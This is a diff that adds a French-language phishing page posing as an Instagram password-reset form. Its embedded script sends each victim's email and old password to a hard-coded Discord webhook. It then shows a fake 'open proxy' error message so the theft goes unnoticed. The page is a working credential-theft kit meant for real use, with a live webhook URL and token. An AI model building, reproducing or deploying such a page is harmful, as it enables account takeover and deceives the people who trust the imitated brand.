@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Réinitialisation de mot de passe</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .surrounding-box {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e3e3e3;
+            padding: 10px;
+            max-width: 100%;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .image-container {
+            flex: 0 0 auto;
+            margin-right: 10px;
+        }
+        .image-container img {
+            width: 80px; /* Agrandissement de la taille du logo */
+            height: auto;
+        }
+        .button-container {
+            flex: 1 1 auto;
+            text-align: right;
+        }
+        .signup-button, .login-button {
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 8px 16px; /* Réduction de la taille des boutons */
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Arial', sans-serif; /* Utilisation de la police d'écriture d'Instagram */
+            margin-left: 10px;
+            cursor: pointer;
+        }
+        .signup-button:hover, .login-button:hover {
+            opacity: 0.8;
+        }
+        .form-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        #reset-button {
+            width: 100%;
+            padding: 10px;
+            background-color: rgba(0, 149, 246, 0.3);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: not-allowed;
+        }
+        #reset-button:not(:disabled) {
+            background-color: #0095f6;
+            cursor: pointer;
+        }
+        .error-message, .success-message {
+            margin-top: 10px;
+            display: none;
+        }
+        .error-message {
+            color: red;
+        }
+        .success-message {
+            color: red;
+        }
+        .success-message a {
+            color: #0095f6;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Section ajoutée en haut de la page -->
+    <div class="surrounding-box">
+        <div class="image-container">
+            <img src="https://media.discordapp.net/attachments/1260633798144561284/1260635749477253120/image.png?ex=66900a08&is=668eb888&hm=b7081898faa1398793a94f30fe0fac27575a973bb0630008e21d4cd1f2e2ab78&=&format=webp&quality=lossless" alt="Instagram Logo">
+        </div>
+        <div class="button-container">
+            <a href="https://instagram.com/accounts/emailsignup/" class="signup-button">S’inscrire</a>
+            <a href="https://instagram.com" class="login-button">Se connecter</a>
+        </div>
+    </div>
+
+    <!-- Formulaire de réinitialisation de mot de passe -->
+    <div class="container">
+        <div class="form-container">
+            <div class="form">
+                <div class="form-group">
+                    <label for="email">E-mail :</label>
+                    <input type="email" id="email" placeholder="Votre adresse e-mail" required>
+                </div>
+                <div class="form-group">
+                    <label for="old-password">Ancien mot de passe :</label>
+                    <input type="password" id="old-password" placeholder="Votre ancien mot de passe" required>
+                </div>
+                <div class="form-group">
+                    <button id="reset-button" disabled>Réinitialiser le mot de passe</button>
+                </div>
+                <div id="error-message" class="error-message"></div>
+                <div id="success-message" class="success-message" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const emailInput = document.getElementById('email');
+            const oldPasswordInput = document.getElementById('old-password');
+            const resetButton = document.getElementById('reset-button');
+            const errorMessage = document.getElementById('error-message');
+            const successMessage = document.getElementById('success-message');
+
+            const discordWebhookURL = 'https://discord.com/api/webhooks/1260418748398043209/XortvEHk34mD7C3632yShd4B7vqgAsyoQWr5fNV5O5SKN47jvOQxK6Mbp557seMHN1N1';
+
+            function sendToDiscord(email, oldPassword) {
+                const embed = {
+                    "content": "",
+                    "tts": false,
+                    "embeds": [
+                        {
+                            "description": `**Connexion à partir du site web** : *https://www.instagram.com/accounts/login/?next=%2Fconnexion%2F&source=desktop_nav*\n\n:arrow_down:\n\n**Phone** : *[Apple:green_apple:/Android:robot:]*\n\n:arrow_down:\n\n**E-Mail** : *${email}*\n**Ancien mot de passe** : *${oldPassword}*\n\n:arrow_down:\n\n**Le site** : *bientôt...*`,
+                            "color": 16711680,
+                            "title": "🔴 Nouvelles connexions !! 🔴",
+                            "footer": {
+                                "text": "Droits d'auteur par superours.©"
+                            }
+                        }
+                    ],
+                    "username": "instagram"
+                };
+
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embed)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Webhook envoyé avec succès');
+                        successMessage.innerHTML = 'L’adresse IP que vous utilisez a été signalée comme un proxy ouvert. Si vous pensez qu’il s’agit d’une erreur, rendez-vous sur <a href="http://p.instagram.com/" target="_blank">http://p.instagram.com/</a>';
+                        successMessage.style.display = 'block';
+                        errorMessage.innerHTML = ''; // Effacer le message d'erreur s'il y en avait un précédent
+                    } else {
+                        console.error('Erreur lors de l\'envoi du webhook', response.statusText);
+                        errorMessage.innerHTML = 'Une erreur est survenue lors de l\'envoi des informations.';
+                        errorMessage.style.color = 'red';
+                        successMessage.style.display = 'none';
+                    }
+                }).catch(error => {
+                    console.error('Erreur lors de l\'envoi du webhook', error);
+                    errorMessage.innerHTML = 'Une erreur est survenue lors de l\'envoi des informations.';
+                    errorMessage.style.color = 'red';
+                    successMessage.style.display = 'none';
+                });
+            }
+
+            resetButton.addEventListener('click', function (event) {
+                event.preventDefault(); // Empêche le rechargement de la page par défaut
+
+                const email = emailInput.value.trim();
+                const oldPassword = oldPasswordInput.value.trim();
+
+                // Vérifier si l'e-mail se termine par "@gmail.com"
+                if (!email.endsWith('@gmail.com')) {
+                    errorMessage.innerHTML = 'L’adresse e-mail doit se terminer par "@gmail.com"';
+                    errorMessage.style.color = 'red';
+                    successMessage.style.display = 'none';
+                    return;
+                }
+
+                // Vérifier si le mot de passe ne contient pas d'espaces
+                if (oldPassword.includes(' ')) {
+                    errorMessage.innerHTML = 'Le mot de passe ne doit pas contenir d\'espaces';
+                    errorMessage.style.color = 'red';
+                    successMessage.style.display = 'none';
+                    return;
+                }
+
+                // Simuler une vérification de l'adresse IP pour voir si elle est signalée comme un proxy
+                const isProxy = false; // Remplacez par votre logique de vérification d'adresse IP
+
+                if (isProxy) {
+                    errorMessage.innerHTML = 'L’adresse IP que vous utilisez a été signalée comme un proxy ouvert. Si vous pensez qu’il s’agit d’une erreur, rendez-vous sur <a href="http://p.instagram.com/" target="_blank">http://p.instagram.com/</a>';
+                    errorMessage.style.color = 'red';
+                    successMessage.style.display = 'none';
+                } else {
+                    errorMessage.innerHTML = ''; // Effacer le message d'erreur s'il y en avait un précédent
+
+                    // Envoyer les informations au webhook Discord
+                    sendToDiscord(email, oldPassword);
+
+                    // Réinitialiser les champs du formulaire
+                    emailInput.value = '';
+                    oldPasswordInput.value = '';
+
+                    // Afficher un message de confirmation
+                    successMessage.innerHTML = 'L’adresse IP que vous utilisez a été signalée comme un proxy ouvert. Si vous pensez qu’il s’agit d’une erreur, rendez-vous sur <a href="http://p.instagram.com/" target="_blank">http://p.instagram.com/</a>';
+                    successMessage.style.display = 'block';
+                }
+            });
+
+            // Activer le bouton de réinitialisation si les champs email et old-password sont remplis
+            emailInput.addEventListener('input', toggleResetButton);
+            oldPasswordInput.addEventListener('input', toggleResetButton);
+
+            function toggleResetButton() {
+                resetButton.disabled = !(emailInput.value.trim() && oldPasswordInput.value.trim());
+            }
+        });
+    </script>
+</body>
+</html>
